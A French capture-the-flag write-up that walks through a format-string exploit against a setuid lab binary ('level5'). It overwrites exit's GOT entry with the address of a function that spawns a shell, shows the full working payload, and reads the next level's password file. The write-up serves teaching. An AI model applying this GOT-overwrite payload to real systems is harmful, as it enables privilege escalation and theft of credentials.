Je commence par découvrir qui je suis, où je suis, et qu'est-ce qui est à ma disposition :

```bash
$ id && pwd && ls -la
uid=2045(level5) gid=2045(level5) groups=2045(level5),100(users)
/home/user/level5
total 17
dr-xr-x---+ 1 level5 level5   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level5 level5  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level5 level5 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level6 users  5385 Mar  6  2016 level5
-rw-r--r--+ 1 level5 level5   65 Sep 23  2015 .pass
-rw-r--r--  1 level5 level5  675 Apr  3  2012 .profile
```

Je tente de lancer le binaire level4 :

```bash
$ ./level5
(waiting for input)
$ ./level5
da
da
```

Je recoupe l'analyse ASM du binaire avec GDB des résultats obtenus sur [Dogbolt](https://dogbolt.org/?id=ba35d828-02dc-44ac-a188-182a91119498) et en extrait une version probable du code :

```c
void o()
{
    system("/bin/sh");

    _exit(1);
}

void n()
{
    char buffer[512];

    fgets(buffer, 512, stdin);
    printf(buffer);

    exit(1);
}

int main()
{
    n();
}
```

Je note les choses suivante :

- `fgets()` est utilisé, et n'est donc pas vulnérable
- `printf()` est utilisé, probablement expoitable comme le `level3` et `level4`

Je note un buffer plus grand que ce que `fgets()` lit, mais dans le niveau précédent c'était sans intérêt et je ne m'y intéresserait donc pas ici également. J'estime que la source de vulnérabilité ici est encore `printf()` et qu'il me faut par conséquent appeller la fonction `o()` au travers de cette vulnérabilité, afin d'obtenir le shell et le `.pass` du niveau suivant par extension.

J'obtiens l'adresse de `o()` avec `gdb` :

```h
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:     push   %ebp <---------- ici
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x18,%esp
   0x080484aa <+6>:     movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
   0x080484b6 <+18>:    movl   $0x1,(%esp)
   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
End of assembler dump.
```

J'ai donc un premier élément important pour mon payload : `0x080484a4` (adresse de la fonction `o()` dans la stack).

Ce qui diffère des précedents niveaux ici, c'est qu'il ne s'agit pas de changer la valeur d'une variable mais bien d'appeller une autre fonction. Je me renseigne sur internet sur les vulnérabilité possible en ce sens et tombe sur un type de vulnérabilité du nom de [Ret2Plt](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got).

Ce type de vulnérabilité exploite le passage entre le `PLT` et le `GOT`, vulgarisé, cela implique les choses suivante :

- Un programme en C n'est pas compilé avec la `libc`, afin d'alléger le poids des binaires, donc, lors de la compilation, ces calls sont attribués un pointeur vers la `PLT` (Procedure Linkage Table)
- Lors de l'exécution du programme, chaque 'call' dans le code qui pointe vers une fonction de la `libc` (par exemple `exit()`) va passer au travers d'un procédé de `dynamic linking`.
- Avant ce passage, et comme on peut l'observer dans le `disas o` de `gdb` au dessus, ces 'call' sont suffixés par `@plt`, ce qui indique au runtime d'aller chercher dans la `GOT` (Global Offset Table) à quelle fonction cela correspond.
- Après ce passage, ces 'call' sont résolus par la conjonction de la `PLT` et la `GOT` afin d'associer un 'call' dans le binaire compilé, a une fonction de la `libc`.

Il va être pour nous ici question de changer vers quoi :

```h
(gdb) disas n
Dump of assembler code for function n:
    ...
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
```

`exit` pointe par son `plt`. Si nous pouvons "faire croire" à l'exécutable qu'`exit` est une fonction qui pointe vers `o()`, alors, au moment du `dynamic linking`, le programme résoudra que le call `exit` pointe vers la fonction `o()` et non la vraie fonction `exit` de la `libc`.

Pour construire un payload infecté qui effectue ce genre de shenaniganerie, ce dernier devra contenir :

- L'adresse de `o()`
- L'adresse `plt` de `exit()`

Je suis heurté a des problématiques similaire au précédents niveaux. Tout d'abord, le buffer est trop petit pour écrire les caractères avec `%n` dans un pointeur afin de changer son adresse, donc comme auparavent, je devrais utiliser l'astuce avec `%p` pour bypass la taille qui m'est allouée.

Le but du payload sera donc, je résume : de changer la valeur `@plt` vers quoi pointe `exit`.
Donner à `exit` comme valeur de pointeur, celle de l'adresse de `o()`.

Première étape, je trouve l'adresse '`plt`' de `exit` :

```h
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838 <----------------- ici
   0x080483d6 <+6>:     push   $0x28
   0x080483db <+11>:    jmp    0x8048370
End of assembler dump.
```

Je construit mon payload dans l'optique de l'exploiter comme au `level4`, en voici donc la première partie :

```python
python -c 'print("\x08\x04\x98\x38"[::-1])'
```

J'ai plus haut trouvé l'adresse de `o()` : `0x080484a4`. Il me faut la traduire en une valeur décimale afin de savoir la valeur de padding à utiliser dans l'astuce du format `%p`. J'utilise ce site : [RapidTables](https://www.rapidtables.com/convert/number/hex-to-decimal.html) et trouve : `134513828`.

Comme pour le précedent niveau, je soustrais 4 bytes à ce chiffre pour inclure les précédents 4 bytes déjà écrit de l'adresse `plt` d'`_exit`, et ajoute ça à mon payload :

```python
python -c 'print("\x08\x04\x98\x38"[::-1] + "%134513824p")'
```

Il ne me reste plus qu'à utiliser l'exploit avec `%n` afin d'écrire tout ces caractères dans l'adresse d'`exit`.
Il me faut d'abord trouver avec l'astuce du `%x`, a quelle position se trouve cette adresse dans le contexte de la stack de `printf()` :

```bash
$ python -c 'print("a %x %x %x %x %x")' | ./level5
a 200 b7fd1ac0 b7ff37d0 78252061 20782520
                               ^
$ python -c 'print("b %x %x %x %x %x")' | ./level5
b 200 b7fd1ac0 b7ff37d0 78252062 20782520
                               ^
```

C'est donc ici le 4ème argument. Je peux donc conclure mon payload infecté :

```python
python -c 'print("\x08\x04\x98\x38"[::-1] + "%134513824p" + "%4$n")'
```

Pour rappel sur les 3 précédents niveaux : ces exploits fonctionnent dû au fait que `printf()` lit le buffer que `fgets()` lui donne, qui vient de nous. Cela représente une vulnérabilité car nous pouvons exploiter les formatteur du type : `%n`. Etant donné que ces derniers fonctionnent sur les arguments passés à `printf()`, mais qu'aucun sont présents, nous pouvons donc effectivement arbitrairement changer des valeurs dans la stack.

J'essaye mon payload :

```bash
$ (python -c 'print("\x08\x04\x98\x38"[::-1] + "%134513824p" + "%4$n")' && echo 'cat /home/user/level6/.pass') | ./level5
... (134 millions d'espace de padding)
                                                        0x200 (comme pour le level 4, le premier argument de la stack est imprimé, ici 512, la taille du buffer passé en paramètre)
(puis, la clé est imprimé, ce qui implique que nous avons correctement réussis à exécuter o(), ce qui implique que nous avons correctement réussis à ré-écrire ce vers quoi exit() a été linké, ici, donc, o())
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

Autre sources utilisées :
https://www.airs.com/blog/archives/38 (20 parties ! ! !)
https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc (très bon graphique qui illustre le payload inclus)
